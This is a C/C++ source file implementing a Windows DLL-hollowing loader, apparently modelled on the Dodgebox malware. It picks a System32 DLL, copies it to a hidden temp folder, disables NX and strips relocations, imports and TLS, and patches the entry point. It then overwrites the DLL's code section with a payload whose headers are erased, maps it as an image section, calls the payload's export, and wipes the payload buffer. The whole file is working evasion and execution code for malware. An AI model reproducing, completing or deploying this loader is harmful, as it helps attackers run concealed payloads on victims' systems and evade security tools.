#include <Windows.h>
#include "ultis-string.h"
#include "api.h"
#include "constant.h"
#include "decrypt.h"
#include "resolver.h"

#define VALID_DLL_NUMBER 64
constexpr const wchar_t *dll_blacklist[] = {
    L"advapi32.dll", L"bcrypt.dll", L"bcryptprimitives.dll", L"cfgmgr32.dll",
    L"combase.dll", L"cryptbase.dll", L"cryptsp.dll", L"dhcpcsvc.dll",
    L"dhcpcsvc6.dll", L"dnsapi.dll", L"FWPUCLNT.DLL", L"gdi32.dll",
    L"gdi32full.dll", L"iertutil.dll", L"imm32.dll", L"IPHLPAPI.DLL",
    L"kernel.appcore.dll", L"kernel32.dll", L"KernelBase.dll", L"locale.nls",
    L"msvcp_win.dll", L"msvcrt.dll", L"mswsock.dll", L"NapiNSP.dll",
    L"nlaapi.dll", L"nsi.dll", L"ntdll.dll", L"ntmarta.dll",
    L"oleaut32.dll", L"OnDemandConnRouteHelper.dll", L"pnrpnsp.dll", L"powrprof.dll",
    L"apphelp.dll", L"profapi.dll", L"rasadhlp.dll", L"rpcrt4.dll",
    L"rsaenh.dll", L"sechost.dll", L"SHCore.dll", L"shell32.dll",
    L"shlwapi.dll", L"sspicli.dll", L"ucrtbase.dll", L"urlmon.dll",
    L"user32.dll", L"userenv.dll", L"webio.dll", L"win32u.dll",
    L"windows.storage.dll", L"winhttp.dll", L"wininet.dll", L"winnlsres.dll",
    L"winnsi.dll", L"winrnr.dll", L"winsta.dll", L"ws2_32.dll",
    L"wshbth.dll", L"wtsapi32.dll"};
const wchar_t *valid_dll[VALID_DLL_NUMBER] = {0};

size_t total_dlls = sizeof(dll_blacklist) / sizeof(dll_blacklist[0]);
wchar_t target_dll_path[MAX_PATH] = {0};
wchar_t system_dir[MAX_PATH] = {0};
DWORD target_dll_size = 0;
ULONG_PTR payload_export_function_offset = 0;

// first init - find dll to becom shells
BOOL is_qualify_dll(const wchar_t *dll_name, DWORD payload_image_size)
{
    if (!dll_name || payload_image_size == -1)
        return FALSE;
    // remember to free
    PVOID target_dll_base = NULL;
    DWORD buffer_size;
    if (!read_file(&target_dll_base, &buffer_size, dll_name))
        return FALSE;
    DWORD target_text_section_size = get_section_size(target_dll_base, H_TEXT_SECTION);

    if (target_text_section_size != -1 && target_text_section_size >= payload_image_size)
    {
        HeapFree(GetProcessHeap(), MEM_RELEASE, target_dll_base);
        return TRUE;
    }
    HeapFree(GetProcessHeap(), MEM_RELEASE, target_dll_base);
    return FALSE;
}
BOOL is_blacklist(const wchar_t *dll_name)
{
    if (!dll_name)
        return FALSE;
    for (DWORD i = 0; i < total_dlls; i++)
    {
        if (wstring_compare(dll_name, dll_blacklist[i], MAX_PATH) == 0)
        {
            return TRUE;
        }
    }
    return FALSE;
}
BOOL search_for_valid_dll(DWORD payload_image_size)
{
    if (payload_image_size == -1 || !api)
        return FALSE;

    NTSTATUS status;

    wchar_t searching_path[MAX_PATH] = {0};
    wchar_t dll_path[MAX_PATH] = {0};
    status = api->FUNCTIONS.GetSystemDirectoryW(system_dir, MAX_PATH);
    if (!NT_SUCCESS(status))
        return FALSE;

    wcscpy_s(searching_path, MAX_PATH, system_dir);
    wcscat_s(searching_path, MAX_PATH, L"\\*.dll");

    HANDLE file_handle;
    WIN32_FIND_DATAW file_info;
    file_info.nFileSizeHigh = sizeof(WIN32_FIND_DATAW);
    file_handle = FindFirstFileW(searching_path, &file_info);
    if (!file_handle)
        return FALSE;
    DWORD counter = 0;
    if (file_handle != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!is_blacklist(file_info.cFileName))
            {
                wcscpy_s(dll_path, MAX_PATH, system_dir);
                wcscat_s(dll_path, MAX_PATH, L"\\");
                wcscat_s(dll_path, MAX_PATH, file_info.cFileName);
                if (dll_path)
                {
                    if (is_qualify_dll(dll_path, payload_image_size))
                    {
                        valid_dll[counter] = _wcsdup(dll_path);
                        counter++;

                        if (counter >= VALID_DLL_NUMBER)
                            break;
                    };
                }
                dll_path[0] = L'\0';
            }
            else
                continue;
        } while (FindNextFileW(file_handle, &file_info));
        FindClose(file_handle);
    }
    return TRUE;
}

// init the outer shell
BOOL copy_dll_to_new_path(wchar_t *dll_path, DWORD size)
{
    if (!api)
        return FALSE;

    DWORD random_index = get_random_index(total_dlls);
    if (!valid_dll[random_index])
        return FALSE;

    wchar_t valid_dll_path[MAX_PATH] = {0};
    wchar_t new_dll_path[MAX_PATH] = {0};
    wchar_t machine_uid[MAX_PATH] = {0};

    wcscpy_s(valid_dll_path, MAX_PATH, valid_dll[random_index]);
    wchar_t *dll_name = wcsrchr(valid_dll_path, L'\\');
    get_machine_uid(machine_uid, MAX_PATH);
    wcscat_s(new_dll_path, MAX_PATH, L"C:\\Temp\\DodgeboxGoesHere\\");
    wcscat_s(new_dll_path, MAX_PATH, machine_uid);

    DWORD result = api->FUNCTIONS.SHCreateDirectoryExW(NULL, new_dll_path, NULL);
    if (result != ERROR_SUCCESS && result != ERROR_ALREADY_EXISTS && result != ERROR_FILE_EXISTS)
    {
        return FALSE;
    }

    wcscat_s(new_dll_path, MAX_PATH, L"\\");
    wcscat_s(new_dll_path, MAX_PATH, dll_name);

    if (CopyFile(valid_dll[random_index], new_dll_path, FALSE) == 0)
    {
        return FALSE;
    }
    memcpy_s(dll_path, size, new_dll_path, MAX_PATH);
    return TRUE;
}

// modifying pay load and outer shell
BOOL modify_target_dll(PVOID dll_base, DWORD payload_text_section_size)
{
    if (!dll_base)
        return FALSE;
    const unsigned char byte_patch[6] = {
        0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3};

    PBYTE base_address = (PBYTE)dll_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base_address;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base_address + dos->e_lfanew);
    if (!nt_header)
        return FALSE;
    // disable NX
    nt_header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
    // remove reloc tls
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = 0;
    // patch byte return 1
    ULONG_PTR entry_point_offset = rva_to_offset(dll_base, nt_header->OptionalHeader.AddressOfEntryPoint);
    if (entry_point_offset != 0)
    {
        PBYTE entry = (PBYTE)dll_base + entry_point_offset;
        for (int i = 0; i < sizeof(byte_patch); i++)
        {
            entry[i] = byte_patch[i];
        }
    }
    // fix .text section & remove all orther sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_header);
    int number_of_sections = nt_header->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER text_section = (PIMAGE_SECTION_HEADER)get_section(dll_base, H_TEXT_SECTION);
    if (!text_section)
        return FALSE;

    DWORD file_align = nt_header->OptionalHeader.FileAlignment;
    DWORD section_align = nt_header->OptionalHeader.SectionAlignment;
    if (!file_align || !section_align)
        return FALSE;

    DWORD file_blocks = (payload_text_section_size + file_align - 1) / file_align;
    text_section->SizeOfRawData = file_blocks * file_align;

    DWORD memory_pages = (payload_text_section_size + section_align - 1) / section_align;
    text_section->Misc.VirtualSize = memory_pages * section_align;

    text_section->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE; // set permission for section
    nt_header->OptionalHeader.SizeOfImage = text_section->VirtualAddress + text_section->Misc.VirtualSize;
    int text_section_index = (int)(text_section - section);

    // remove other sections
    if (text_section_index + 1 < number_of_sections)
    {
        DWORD orther_section_header_size = (number_of_sections - (text_section_index + 1)) * sizeof(IMAGE_SECTION_HEADER);
        SecureZeroMemory(&section[text_section_index + 1], orther_section_header_size);
    }

    nt_header->FileHeader.NumberOfSections = text_section_index + 1;

    return TRUE;
}
BOOL modify_payload(PVOID payload_address)
{
    if (!payload_address)
        return FALSE;
    PBYTE base_address = (PBYTE)payload_address;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base_address;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(base_address + dos->e_lfanew);
    if (!nt_header)
        return FALSE;

    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress = 0;
    nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size = 0;

    DWORD header_size = nt_header->OptionalHeader.SizeOfHeaders;
    if (!header_size)
        return FALSE;
    // remove payload header
    SecureZeroMemory(base_address, header_size);
    return TRUE;
}
BOOL overwrite_dll(PVOID dll_base, DWORD dll_size, PVOID payload_address, DWORD payload_size)
{
    if (!target_dll_path || !dll_base || !payload_address)
        return FALSE;

    DWORD target_text_offset = get_section_offset(dll_base, H_TEXT_SECTION);
    DWORD payload_text_offset = get_section_offset(payload_address, H_TEXT_SECTION);

    DWORD payload_text_section_size = payload_size - payload_text_offset;

    if (!modify_target_dll(dll_base, payload_text_section_size))
    {
        HeapFree(GetProcessHeap(), MEM_RELEASE, dll_base);
        return FALSE;
    }
    if (!modify_payload(payload_address))
    {
        HeapFree(GetProcessHeap(), MEM_RELEASE, dll_base);
        return FALSE;
    }

    HANDLE file_handle = NULL;
    DWORD bytes_written = 0;
    file_handle = CreateFileW(target_dll_path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    // write dll header to .text
    if (!WriteFile(file_handle, dll_base, target_text_offset, &bytes_written, NULL))
    {
        CloseHandle(file_handle);
        return FALSE;
    }

    // from .text to end
    PBYTE payload_text_address = (PBYTE)payload_address + payload_text_offset;
    if (!WriteFile(file_handle, payload_text_address, payload_text_section_size, &bytes_written, NULL))
    {
        CloseHandle(file_handle);
        return FALSE;
    }

    if (!SetEndOfFile(file_handle))
    {
        CloseHandle(file_handle);
        return FALSE;
    }
    CloseHandle(file_handle);
    return TRUE;
}

// final the shell
BOOL parasitic_payload(PVOID payload_address, DWORD payload_size, PVOID dll_base, DWORD dll_size)
{
    if (!payload_address || !dll_base)
        return FALSE;
    if (!overwrite_dll(dll_base, dll_size, payload_address, payload_size))
    {
        return FALSE;
    }
    return TRUE;
}

BOOL init_dll_shell(PVOID payload_address, DWORD payload_size)
{
    if (!target_dll_path || !payload_address)
        return FALSE;

    DWORD payload_image_size = -1;
    payload_image_size = get_image_size(payload_address);
    if (payload_image_size == -1)
        return FALSE;
    // find target
    if (!search_for_valid_dll(payload_image_size))
    {
        return FALSE;
    }
    // copy to new path
    if (!copy_dll_to_new_path(target_dll_path, MAX_PATH))
    {
        return FALSE;
    };
    if (!target_dll_path)
        return FALSE;

    // combine payload and target dll
    PVOID dll_base = NULL;
    DWORD dll_size;
    read_file(&dll_base, &dll_size, target_dll_path);
    if (!dll_base)
        return FALSE;
    if (!parasitic_payload(payload_address, payload_size, dll_base, dll_size))
    {
        HeapFree(GetProcessHeap(), MEM_RELEASE, dll_base);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), MEM_RELEASE, dll_base);
    return TRUE;
}

BOOL hollow_n_execute()
{
    HANDLE file_handle = NULL;
    NTSTATUS status = 0;
    file_handle = CreateFileW(target_dll_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE)
        return FALSE;

    HANDLE section_handle = NULL;
    PVOID section_base = NULL;
    SIZE_T section_size = 0;
    status = api->FUNCTIONS.NtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, file_handle);
    if (!NT_SUCCESS(status))
    {
        return FALSE;
    }

    status = api->FUNCTIONS.NtMapViewOfSection(section_handle, (HANDLE)-1, &section_base, 0, 0, NULL, &section_size, ViewShare, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        return FALSE;
    }
    ULONG old_protect = 0;
    api->FUNCTIONS.NtProtectVirtualMemory((HANDLE)-1, &section_base, &section_size, PAGE_EXECUTE_READ, &old_protect);
    CloseHandle(file_handle);
    CloseHandle(section_handle);

    // find execute point in section base
    PIMAGE_SECTION_HEADER text_section = (PIMAGE_SECTION_HEADER)get_section(section_base, H_TEXT_SECTION);
    if (!text_section)
        return FALSE;

    // find the export function address
    PVOID function_address = (PVOID)((ULONG_PTR)text_section->VirtualAddress + (ULONG_PTR)section_base + payload_export_function_offset);
    if (!function_address)
        return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)section_base;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((PBYTE)section_base + dos->e_lfanew);

    // if(!register_and_mask_section(section_base,nt_header->OptionalHeader.SizeOfImage, ((PBYTE)section_base + nt_header->OptionalHeader.AddressOfEntryPoint), target_dll_path, system_dir)) return FALSE;

    // launching rockett
    ((void (*)())function_address)();

    return TRUE;
}

BOOL dll_hollowing(PVOID payload_address, DWORD payload_size)
{
    if (!payload_address)
        return FALSE;
    payload_export_function_offset = get_export_function_offset(payload_address, H_EXPORT_FUNCTION);
    // outer shell
    if (!init_dll_shell(payload_address, payload_size))
    {
        return FALSE;
    }

    // calling the launcher
    if (!hollow_n_execute())
    {
        return FALSE;
    }
    memset(payload_address, 0x90, payload_size);

    return TRUE;
}